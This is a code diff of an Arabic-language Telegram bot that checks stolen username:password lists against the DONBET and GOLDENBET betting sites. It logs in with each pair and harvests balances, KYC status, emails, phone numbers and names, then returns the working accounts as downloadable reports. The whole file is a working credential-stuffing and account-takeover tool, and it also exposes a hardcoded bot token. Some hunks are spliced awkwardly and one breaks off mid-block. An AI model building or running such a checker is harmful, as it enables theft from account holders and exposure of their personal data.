@@ -1,4 +1,3 @@
-
 import requests
 import json
 import os
@@ -12,10 +11,10 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 BOT_TOKEN = "8606519407:AAG6QxZbjypnFwkEuizU3yb5JDzmPCPWVoc" 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# عدد الخيوط (Threads) للفحص عبر التلجرام
-MAX_WORKERS = 2
+# عدد الخيوط (Threads) للفحص
+MAX_WORKERS = 4
 
-# قاموس لتخزين بيانات المستخدمين الحالية (تفادياً للتداخل)
+# قاموس لتخزين بيانات المستخدمين الحالية
 user_sessions = {}
 
 # ----------------- الإعدادات الخاصة بموقع DONBET -----------------
@@ -94,8 +93,6 @@ def check_goldenbet_account(account, stats):
         with requests.Session() as session:
             session.headers.update(GOLDENBET_HEADERS)
             session.cookies.update(GOLDENBET_COOKIES)
-            try: session.get("https://m.goldenbet.com/eng/static/login", timeout=10)
-            except: pass
             
             login_payload = {"UserName": username.strip(), "Password": password.strip(), "ConfirmationStatus": None}
             login_resp = session.post("https://m.goldenbet.com/api/profile/login", json=login_payload, timeout=15)
@@ -169,7 +166,7 @@ def make_progress_text(site, stats, total):
                 f"💰 حسابات بها إيداع: {stats['has_deposited']}\n"
                 f"📱 هاتف مفعل: {stats['phone_verified']}\n"
                 f"📧 إيميل مفعل: {stats['mail_verified']}\n"
-                f"🔒 إجمالي المحققة: {stats['verified']}")
+                f"🔒 إجمالي المحققة/النشطة: {stats['verified']}")
 
 def make_progress_keyboard():
     markup = InlineKeyboardMarkup()
@@ -178,7 +175,6 @@ def make_progress_keyboard():
     return markup
 
 def auto_update_loop(chat_id, message_id, user_id):
-    """خيط لتحديث الإحصائيات تلقائياً كل 4 ثوانٍ"""
     while True:
         time.sleep(4)
         if user_id not in user_sessions or not user_sessions[user_id].get('is_running', False):
@@ -195,8 +191,8 @@ def auto_update_loop(chat_id, message_id, user_id):
 # ----------------- أوامر واستجابات البوت -----------------
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    user_sessions[message.from_user.id] = {} # ريست لجلسة المستخدم
-    text = "👋 مرحباً بك في بوت فحص الحسابات المتطور!\n\n📌 *اختر أولاً الموقع الذي تريد فحص حساباته من الأزرار أدناه:*"
+    user_sessions[message.from_user.id] = {}
+    text = "👋 مرحباً بك في بوت فحص الحسابات الاحترافي!\n\n📌 *اختر الموقع الذي تريد فحص حساباته من الأزرار أدناه:*"
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("🎰 موقع DONBET", callback_data="select_donbet"))
     markup.row(InlineKeyboardButton("🥇 موقع GOLDENBET", callback_data="select_goldenbet"))
@@ -229,9 +225,7 @@ def handle_callbacks(call):
         if user_id in user_sessions and user_sessions[user_id].get('is_running', False):
             user_sessions[user_id]['is_running'] = False
             bot.answer_callback_query(call.id, "🛑 تم إيقاف الفحص")
-            bot.edit_message_text("🛑 تم إيقاف عملية الفحص بناءً على طلبك. جاري تجهيز الملفات المستخرجة حتى الآن...", chat_id, call.message.message_id)
-        else:
-            bot.answer_callback_query(call.id, "❌ الفحص متوقف بالفعل")
+            bot.edit_message_text("🛑 تم إيقاف عملية الفحص. جاري معالجة وإرسال الملفات المستخرجة حتى الآن...", chat_id, call.message.message_id)
 
 @bot.message_handler(content_types=['document'])
 def handle_accounts_file(message):
@@ -272,7 +266,6 @@ def handle_accounts_file(message):
             
         site = user_sessions[user_id]['site']
         
-        # تهيئة الإحصائيات حسب الموقع المحدد
         if site == "donbet":
             stats = {'valid': 0, 'invalid': 0, 'kyc_verified': 0, 'high_points': 0, 'checked': 0}
         else:
@@ -284,27 +277,27 @@ def handle_accounts_file(message):
         
         bot.edit_message_text(f"🚀 تم بدء فحص {total} حساب على موقع {site.upper()}...", chat_id, status_msg.message_id, reply_markup=make_progress_keyboard())
         
-        # بدء خيط التحديث التلقائي
         threading.Thread(target=auto_update_loop, args=(chat_id, status_msg.message_id, user_id), daemon=True).start()
-        
-        # تشغيل خيط الفحص الأساسي لتجنب تجميد البوت
         threading.Thread(target=process_checker_threads, args=(user_id, chat_id, status_msg.message_id, accounts), daemon=True).start()
 
     except Exception as e:
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")
 
-# ----------------- معالجة عملية الفحص (الخيوط وحفظ النتائج) -----------------
+# ----------------- معالجة عملية الفحص وإرسال النتائج -----------------
 def process_checker_threads(user_id, chat_id, message_id, accounts):
     session_data = user_sessions[user_id]
     site = session_data['site']
     stats = session_data['stats']
     total = session_data['total']
     
-    # ملفات الإخراج المخصصة للمستخدم
     short_report = f"{site}_verified_accounts_{user_id}.txt"
     detailed_report = f"{site}_detailed_report_{user_id}.txt"
-    points_report = f"donbet_high_points_{user_id}.txt" # لموقع donbet فقط
+    points_report = f"donbet_high_points_{user_id}.txt"
     
+    # حذف أي مخلفات قديمة قبل البدء
+    for path in [short_report, detailed_report, points_report]:
+        if os.path.exists(path): os.remove(path)
+        
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         if site == "donbet":
             future_to_account = {executor.submit(check_donbet_account, acc, stats): acc for acc in accounts}
@@ -313,7 +306,7 @@ def process_checker_threads(user_id, chat_id, message_id, accounts):
             
         for future in as_completed(future_to_account):
             if not user_sessions.get(user_id, {}).get('is_running', False):
-                break # إذا ضغط المستخدم إلغاء
+                break
                 
             try:
                 res = future.result()
@@ -336,218 +329,48 @@ def process_checker_threads(user_id, chat_id, message_id, accounts):
                 else:
                     username, password, is_valid, account_data, is_verified = res
                     if is_valid and account_data:
-                        # لحفظ الحسابات الشغالة كلها أو المحققة فقط حسب رغبتك (هنا سنحفظ الصالحة والمحققة)
                         line = f"{username}:{password} | KYC={account_data['kyc_status']} | Deposited={account_data['deposited_before']} | Phone={account_data['phone_verified']} | Mail={account_data['mail_verified']} | Balance={account_data['balance']} | Email={account_data['email']}\n"
                         with open(short_report, 'a', encoding='utf-8') as f: f.write(line)
                         
-                        if is_verified:
-                            with open(detailed_report, 'a', encoding='utf-8') as f:
-                                f.write("=" * 60 + "\n")
-                                f.write(f"✅ حساب GOLDENBET: {username}:{password}\n")
-                                f.write(f"👤 الاسم: {account_data['first_name']} {account_data['last_name']} | المستخدم: {account_data['user_name']}\n")
-                                f.write(f"📧 الإيميل: {account_data['email']} | 📞 الهاتف: {account_data['mobile']}\n")
-                                f.write(f"🔐 التحقق: KYC={account_data['kyc_status']} | إيداع={account_data['deposited_before']} | هاتف={account_data['phone_verified']} | إيميل={account_data['mail_verified']}\n")
-                                f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$) | مكافأة: {account_data['bonus_points']}\n")
-                                f.write(f"📊 البلد: {account_data['country_id']} | تاريخ الإنشاء: {account_data['created_date']}\n")
-                                f.write("=" * 60 + "\n\n")
+                        with open(detailed_report, 'a', encoding='utf-8') as f:
+                            f.write("=" * 60 + "\n")
+                            f.write(f"✅ حساب GOLDENBET: {username}:{password}\n")
+                            f.write(f"👤 الاسم: {account_data['first_name']} {account_data['last_name']} | المستخدم: {account_data['user_name']}\n")
+                            f.write(f"📧 الإيميل: {account_data['email']} | 📞 الهاتف: {account_data['mobile']}\n")
+                            f.write(f"🔐 التحقق: KYC={account_data['kyc_status']} | إيداع={account_data['deposited_before']} | هاتف={account_data['phone_verified']} | إيميل={account_data['mail_verified']}\n")
+                            f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$) | مكافأة: {account_data['bonus_points']}\n")
+                            f.write(f"📊 البلد: {account_data['country_id']} | تاريخ الإنشاء: {account_data['created_date']}\n")
+                            f.write("=" * 60 + "\n\n")
             except:
-         
-def check_single_account(account, stats):
-    """فحص حساب واحد وجلب بياناته"""
-    username, password = account
-    try:
-        with requests.Session() as session:
-            session.headers.update(HEADERS)
-            
-            login_payload = {
-                "UserName": username.strip(),
-                "Password": password.strip(),
-                "ConfirmationStatus": None
-            }
-            
-            login_resp = session.post(LOGIN_URL, data=json.dumps(login_payload), timeout=10)
-            
-            if login_resp.status_code == 200 and login_resp.json().get("status") == 1:
-                profile_resp = session.get(PROFILE_URL, timeout=10)
-                profile_data = profile_resp.json() if profile_resp.status_code == 200 else {}
-                
-                wallets_resp = session.get(WALLETS_URL, timeout=10)
-                wallets_data = wallets_resp.json() if wallets_resp.status_code == 200 else []
-                wallet_info = wallets_data[0] if wallets_data else {}
-                
-                wallet_info_resp = session.get(WALLET_INFO_URL, params={'CurrencyId': "302"}, timeout=10)
-                wallet_info_data = wallet_info_resp.json() if wallet_info_resp.status_code == 200 else {}
-                
-                kyc_status = profile_data.get("KYCStatus", False)
-                current_points = wallet_info_data.get("CurrentPointSum", 0.0)
-                if current_points is None: current_points = 0.0
-                
-                balance = wallet_info.get("Balance", 0)
-                balance_usd = wallet_info.get("BalanceUSD", 0.0)
-                is_high_points = current_points > 100
-                
-                account_data = {
-                    "login": username,
-                    "password": password,
-                    "user_name": profile_data.get("UserName", username),
-                    "email": profile_data.get("Email", ""),
-                    "kyc_status": kyc_status,
-                    "current_points": current_points,
-                    "total_points": wallet_info_data.get("TotalPointSum", 0.0),
-                    "balance": balance,
-                    "balance_usd": balance_usd,
-                    "country_id": profile_data.get("CountryId", ""),
-                    "created_date": profile_data.get("CreateDate", ""),
-                }
-                
-                stats['checked'] += 1
-                stats['valid'] += 1
-                if kyc_status: stats['kyc_verified'] += 1
-                if is_high_points: stats['high_points'] += 1
-                    
-                return (username, password, True, account_data, kyc_status, is_high_points)
-            else:
-                stats['invalid'] += 1
-                stats['checked'] += 1
-                return (username, password, False, None, False, False)
-    except Exception:
-        stats['invalid'] += 1
-        stats['checked'] += 1
-        return (username, password, False, None, False, False)
+                pass
 
-def update_progress_msg(bot, chat_id, message_id, stats, total):
-    """تحديث رسالة التقدم للمستخدم في تليجرام كل ثانيتين"""
-    while stats['checked'] < total and stats['is_running']:
-        try:
-            progress = (stats['checked'] / total) * 100
-            msg = (f"🔄 *جاري فحص الحسابات...*\n\n"
-                   f"📈 التقدم: {stats['checked']}/{total} ({progress:.1f}%)\n"
-                   f"✅ صالحة: {stats['valid']}\n"
-                   f"❌ خاطئة: {stats['invalid']}\n"
-                   f"🆔 توثيق KYC: {stats['kyc_verified']}\n"
-                   f"🪙 نقاط عـالية (>100): {stats['high_points']}")
-            bot.edit_message_text(msg, chat_id, message_id, parse_mode="Markdown")
-        except Exception:
-            pass
-        time.sleep(3)
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.reply_to(message, "👋 مرحباً بك في بوت فحص حسابات *DONBET*!\n\nقم بإرسال ملف الحسابات بصيغة `.txt` يحتوي على الحسابات بتنسيق `user:pass` وسأقوم بفحصها وإرسال النتيجة لك.", parse_mode="Markdown")
-
-@bot.message_handler(content_types=['document'])
-def handle_accounts_file(message):
-    # التحقق من أن الملف نصي
-    if not message.document.file_name.endswith('.txt'):
-        bot.reply_to(message, "❌ عذراً، يرجى إرسال ملف نصي ينتهي بـ `.txt` فقط.")
-        return
-
-    status_msg = bot.reply_to(message, "⏳ جاري تحميل الملف وقراءة الحسابات...")
+    # ----------------- نهاية الفحص وإرسال الملفات المستخرجة -----------------
+    user_sessions[user_id]['is_running'] = False
+    try: bot.delete_message(chat_id, message_id)
+    except: pass
     
-    try:
-        # تحميل الملف من سيرفرات تليجرام
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
+    final_text = (f"🏁 *اكتملت عملية الفحص لموقع {site.upper()}!*\n\n"
+                  f"📊 إجمالي الحسابات المفحوصة: {stats['checked']}/{total}\n"
+                  f"✅ صالحة (Valid): {stats['valid']}\n"
+                  f"❌ خاطئة (Invalid): {stats['invalid']}\n")
+    bot.send_message(chat_id, final_text, parse_mode="Markdown")
+
+    # إرسال الملفات للمستخدم وحذفها فوراً من السيرفر لتوفير المساحة
+    if os.path.exists(short_report) and os.path.getsize(short_report) > 0:
+        with open(short_report, 'rb') as f:
+            bot.send_document(chat_id, f, caption=f"✅ جميع الحسابات الصالحة الشغالة لـ {site.upper()}")
+        os.remove(short_report)
         
-        # قراءة الحسابات وتصفيتها
-        accounts = []
-        lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
-        for line in lines:
-            line = line.strip()
-            if ':' in line:
-                parts = line.split(':', 1)
-                if len(parts) == 2:
-                    accounts.append((parts[0].strip(), parts[1].strip()))
-                    
-        total = len(accounts)
-        if total == 0:
-            bot.edit_message_text("❌ لم يتم العثور على أي حسابات بالتنسيق الصحيح `user:pass` داخل الملف.", message.chat.id, status_msg.message_id)
-            return
-            
-        bot.edit_message_text(f"📊 تم العثور على {total} حساب. جاري بدء الفحص بـ {MAX_WORKERS} خيوط...", message.chat.id, status_msg.message_id)
+    if os.path.exists(detailed_report) and os.path.getsize(detailed_report) > 0:
+        with open(detailed_report, 'rb') as f:
+            bot.send_document(chat_id, f, caption=f"📄 التقرير المفصل للحسابات والبيانات الداخلية لـ {site.upper()}")
+        os.remove(detailed_report)
         
-        # إنشاء إحصائيات مخصصة لهذا الفحص (لكي لا تتداخل طلبات المستخدمين)
-        stats = {
-            'valid': 0, 'invalid': 0, 'kyc_verified': 0, 'high_points': 0,
-            'checked': 0, 'is_running': True
-        }
-        
-        # بدء خيط لتحديث رسالة التقدم في تليجرام
-        progress_thread = threading.Thread(target=update_progress_msg, args=(bot, message.chat.id, status_msg.message_id, stats, total), daemon=True)
-        progress_thread.start()
-        
-        # تسمية ملفات المخرجات المؤقتة لكل مستخدم بشكل فريد
-        user_id = message.from_user.id
-        kyc_file_path = f"kyc_verified_{user_id}.txt"
-        points_file_path = f"high_points_{user_id}.txt"
-        detailed_file_path = f"detailed_report_{user_id}.txt"
-        
-        # بدء الفحص المتوازي
-        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-            future_to_account = {executor.submit(check_single_account, acc, stats): acc for acc in accounts}
-            
-            for future in as_completed(future_to_account):
-                try:
-                    username, password, is_valid, account_data, is_kyc, is_high_points = future.result()
-                    if is_valid and account_data:
-                        line = f"{username}:{password} | KYC={account_data['kyc_status']} | Points={account_data['current_points']} | Balance={account_data['balance']} | Email={account_data['email']}\n"
-                        
-                        # حفظ النقاط العالية
-                        if is_high_points:
-                            with open(points_file_path, 'a', encoding='utf-8') as f:
-                                f.write(line)
-                                
-                        # حفظ حسابات KYC الموثقة
-                        if is_kyc:
-                            with open(kyc_file_path, 'a', encoding='utf-8') as f:
-                                f.write(line)
-                                
-                            # حفظ التقرير المفصل
-                            with open(detailed_file_path, 'a', encoding='utf-8') as f:
-                                f.write("=" * 50 + "\n")
-                                f.write(f"✅ الحساب: {username}:{password}\n")
-                                f.write(f"👤 المستخدم: {account_data['user_name']} | 📧 البريد: {account_data['email']}\n")
-                                f.write(f"🆔 توثيق الـ KYC: محلول ✅\n")
-                                f.write(f"🪙 النقاط الحالية: {account_data['current_points']} | الكلية: {account_data['total_points']}\n")
-                                f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$)\n")
-                                f.write("=" * 50 + "\n\n")
-                except:
-                    pass
-                    
-        # إيقاف خيط التقدم وإرسال النتيجة النهائية
-        stats['is_running'] = False
-        bot.delete_message(message.chat.id, status_msg.message_id)
-        
-        # إرسال تقرير نصي نهائي للمستخدم
-        summary = (f"🏁 *اكتمل فحص الملف بنجاح!*\n\n"
-                   f"📊 إجمالي الحسابات: {total}\n"
-                   f"✅ الشغالة: {stats['valid']}\n"
-                   f"❌ الخاطئة: {stats['invalid']}\n\n"
-                   f"🆔 حسابات توثيق KYC: {stats['kyc_verified']}\n"
-                   f"🪙 حسابات نقاط > 100: {stats['high_points']}\n\n"
-                   f"👇 الملفات المستخرجة تجدها أدناه:")
-        bot.send_message(message.chat.id, summary, parse_mode="Markdown")
-        
-        # إرسال الملفات المستخرجة إذا كانت تحتوي على بيانات
-        if os.path.exists(kyc_file_path):
-            with open(kyc_file_path, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption="🆔 ملف الحسابات الموثقة (KYC)")
-            os.remove(kyc_file_path)
-            
-        if os.path.exists(points_file_path):
-            with open(points_file_path, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption="🪙 ملف الحسابات ذات النقاط العالية (>100)")
-            os.remove(points_file_path)
-            
-        if os.path.exists(detailed_file_path):
-            with open(detailed_file_path, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption="📄 التقرير المفصل للحسابات الناجحة")
-            os.remove(detailed_file_path)
-            
-    except Exception as e:
-        bot.send_message(message.chat.id, f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")
+    if site == "donbet" and os.path.exists(points_report) and os.path.getsize(points_report) > 0:
+        with open(points_report, 'rb') as f:
+            bot.send_document(chat_id, f, caption="🪙 حسابات دونبيت ذات النقاط العالية (>100)")
+        os.remove(points_report)
 
 if __name__ == "__main__":
-    print("🤖 البوت يعمل الآن بنجاح ومستعد لاستقبال الملفات...")
+    print("🤖 البوت تم إصلاحه بنجاح ويعمل الآن بدون تداخل...")
     bot.infinity_polling()
-    
